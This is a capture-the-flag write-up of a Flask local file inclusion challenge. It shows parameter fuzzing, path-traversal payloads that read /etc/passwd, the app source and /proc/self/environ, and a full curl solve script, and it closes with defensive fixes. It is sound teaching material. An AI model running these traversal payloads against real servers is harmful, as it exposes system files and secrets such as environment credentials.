# Sneaky Includes — CTF Writeup

**Category:** Web (Local File Inclusion)
**Points:** 150
**Target:** `http://54.72.82.22:8030`
**Flag:** `safctf{9fdb535dbf8020d488bf8d6a51287778}`

---

## 1. Challenge Description

> **Sneaky Includes** — 150 pts
> *A familiar place can still hold a surprise. It looks like everything is where it should be.*
> *Nothing obvious. Nothing out of place. But something slipped in quietly, hiding among the things you already trust.*
> *Sometimes the smallest inclusion changes everything.*
> Connect to the challenge web service: `http://54.72.82.22:8030`

**Hint interpretation:**

| Phrase | Meaning |
| --- | --- |
| "something slipped in quietly, hiding among the things you already trust" | The secret is not a file on disk — it hides inside the **process environment** (`/proc/self/environ`), i.e. among the variables you trust. |
| "Sometimes the smallest **inclusion** changes everything" | Straight-up **LFI** (Local File Inclusion) pointer. |
| "A familiar place… Nothing out of place" | The app is a plain Flask page with no visible input — the vulnerable parameter is tucked away. |

---

## 2. Recon

### 2.1 Fingerprint

```bash
curl -s -i http://54.72.82.22:8030/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.10.21
Content-Type: text/html; charset=utf-8
```

**Werkzeug/Flask on Python 3.10** — a Python web app, *not* a static host. Think routes and query
parameters, not file extensions.

### 2.2 Read the whole page — there are two planted clues

The rendered page is a "Quiet Grove" themed story. Two details matter:

1. A **broken-looking sentence with a path baked in**:

   ```html
   <p>
       When the traveler finally left, the world felt a little brighter — not because
       it had changed, but because they had <b>/health.</b>
   </p>
   ```

   → `GET /health` returns `OK` (a real liveness route). This confirms a live Flask app but is
   otherwise a **red herring** — it just proves the app is dynamic.

2. An **empty-but-suspicious container**:

   ```html
   <section class="whispers">
       <div class="whisper-title">
           <h3>Whispers of the Grove are</h3>
       </div>
   </section>
   ```

   The "Whispers of the Grove are ____" section is *waiting* for something to be filled in. This is
   the visual tell for the include: **the page content is loaded from a parameter.**

### 2.3 Route enumeration

```bash
for p in /health /robots.txt /console /admin /about /whispers /flag /flag.txt /source /app.py; do
  printf "%-14s " "$p"; curl -s -m 8 -o /dev/null -w "%{http_code}\n" "http://54.72.82.22:8030$p"
done
```

```
/health        200   <- only real extra route ("OK")
everything else 404
```

No `/console`, no exposed `.py`. The bug is in a **query parameter**, not a path.

---

## 3. Step 1 — Find the Injection Parameter

Baseline page length is **8427** bytes. Fuzz common parameter names and watch for a different body:

```bash
B=http://54.72.82.22:8030
for q in page file include p view template name whisper q path doc load inc tpl; do
  len=$(curl -s -m 8 "$B/?$q=about" | wc -c)
  echo "$len  ?$q=about"
done
```

```
59     ?page=about      <-- length changed!
8427   ?file=about
8427   ?include=about
8427   ?p=about
...
```

**`page` is the parameter.** And its value `about` produced a short error page:

```
<h2>Oops! Something went wrong while loading the page.</h2>
```

> `about`, `index`, `home` all fail — the app is looking for a file at a specific relative path,
> and these guesses aren't there. That's an **include**, and includes mean **traversal**.

---

## 4. Step 2 — Confirm LFI

Throw a classic traversal payload at it:

```bash
curl -s "http://54.72.82.22:8030/?page=../../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
...
```

**Local File Inclusion confirmed**, with no sanitisation and no extension appended.

> **Note the relative form:** the absolute `?page=/etc/passwd` *fails*. The include is prefixed with
> a base directory, so you must climb out of it with `../`.

---

## 5. Step 3 — Recover the Source (understand the bug)

The process command line reveals the entry point:

```bash
curl -s "http://54.72.82.22:8030/?page=../../../../proc/self/cmdline" | tr '\0' ' '
# python app/app.py
```

And `/proc/self/environ` leaks the working directory (`PWD=/app`). Counting directories
(`/app/app/pages/home.html` is the intended default), the app source sits two levels up — pull it:

```bash
curl -s "http://54.72.82.22:8030/?page=../app/app.py"
```

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    page = request.args.get("page", "pages/home.html")
    try:
        with open(f"app/{page}", "r") as f:
            content = f.read()
    except Exception:
        content = "<h2>Oops! Something went wrong while loading the page.</h2>"
    return content

@app.route("/health")
def health():
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

**The bug in one line:**

```python
open(f"app/{page}", "r")
```

User input is concatenated straight into a path. No `os.path.basename`, no allow-list, no
`..` filtering. Any file the process can read is readable — including `/proc/`.

---

## 6. Step 4 — The Flag Hides in the Environment

The challenge text says the secret *"slipped in quietly, hiding among the things you already
trust."* On Linux, the process's environment variables live at `/proc/self/environ`:

```bash
curl -s "http://54.72.82.22:8030/?page=../../../../proc/self/environ" | tr '\0' '\n'
```

```
HOSTNAME=8dfeac8e55d6
HOME=/root
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_SHA256=a0da1e72132e950154eca0f6f47d5db828454700de20e5113667940d81e0db04
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.10.21
PWD=/app
FLAG=safctf{9fdb535dbf8020d488bf8d6a51287778}
```

There it is — the flag was passed to the container as an **environment variable**, not written to a
file. No amount of `find /` would have found it; you had to read `/proc`.

### ✅ Flag

```
safctf{9fdb535dbf8020d488bf8d6a51287778}
```

> `NUL` separators are why the output needs `tr '\0' '\n'` (or `tr '\0' ' '`) before it's readable.

---

## 7. Kill Chain Summary

```
http://54.72.82.22:8030/
        │  page is a dynamic include; "Whispers of the Grove are ____" is the tell
        ▼
?page=about  →  "Oops!" (short body) — parameter found by length diffing
        │  traversal
        ▼
?page=../../../../etc/passwd     →  LFI confirmed, no filtering
        │
        ├─ ?page=../../../../proc/self/cmdline   → python app/app.py
        ├─ ?page=../app/app.py                   → open(f"app/{page}") — the bug
        ▼
?page=../../../../proc/self/environ
        │  FLAG=… sitting among trusted env vars
        ▼
safctf{9fdb535dbf8020d488bf8d6a51287778}
```

---

## 8. Full Solve Script

```bash
#!/usr/bin/env bash
# Sneaky Includes — full solve
set -euo pipefail
B="http://54.72.82.22:8030"
T="../../../../../.."          # climb out of app/app/pages/

# 1. confirm LFI
curl -s --get --data-urlencode "page=$T/etc/passwd" "$B/" | head -3

# 2. read the app source (understand the bug)
curl -s --get --data-urlencode "page=../app/app.py" "$B/"

# 3. read the process environment and extract the flag
curl -s --get --data-urlencode "page=$T/proc/self/environ" "$B/" \
  | tr '\0' '\n' | grep '^FLAG='
```

**One-liner:**

```bash
curl -s "http://54.72.82.22:8030/?page=../../../../proc/self/environ" | tr '\0' '\n' | grep FLAG
```

---

## 9. Tools & Techniques

| Tool | Purpose |
| --- | --- |
| `curl` | Route enumeration, parameter fuzzing, payload delivery |
| `--data-urlencode` | Safe encoding of traversal payloads (avoids shell/URL mangling) |
| `tr '\0' '\n'` | Making `/proc` NUL-separated output readable |
| `wc -c` length diffing | Detecting which query parameter actually changes behaviour |
| Python `open()` semantics | Understanding the relative include prefix |
| HexStrike MCP / BlackBook MCP | Offensive orchestration + technique grounding |

### Techniques

1. **Parameter discovery by response-length diffing** — the baseline body was 8427 bytes; the
   correct parameter dropped it to 59. Cheap, reliable, no wordlist of payloads needed.
2. **Path traversal / LFI** — `../../../../etc/passwd`.
3. **Source disclosure via LFI** — reading the app's own `.py` to confirm the sink.
4. **`/proc` filesystem abuse** — `cmdline`, `environ`, `cwd` to leak process metadata and secrets
   that are not stored on disk.
5. **Environment-variable secret extraction** — the "hiding among things you trust" hint.

---

## 10. Defender Takeaways

- **Never concatenate user input into a filesystem path.** The fix here is a strict allow-list:

  ```python
  PAGES = {"home", "about", "contact"}
  page = request.args.get("page", "home")
  if page not in PAGES:
      abort(404)
  with open(f"app/pages/{page}.html") as f:
      return f.read()
  ```

  If arbitrary paths are genuinely needed, resolve and verify containment:

  ```python
  base = os.path.realpath("app/pages")
  target = os.path.realpath(os.path.join(base, page))
  if not target.startswith(base + os.sep):
      abort(403)
  ```

- **Never put secrets in environment variables** if the app can be coerced into reading
  `/proc/self/environ`. Use a secret manager or a mounted, permission-restricted file — and
  remember that even a file is only as safe as the app's file-read surface.
- **Disable `render_template_string` / raw includes for user input** entirely.
- **Run the app as an unprivileged user** and lock down `/proc` access (hidepid) where possible —
  though note that `/proc/self/environ` is readable by the process itself regardless.
- Treat `..`, absolute paths, and `%00` as hostile input; normalise and reject.
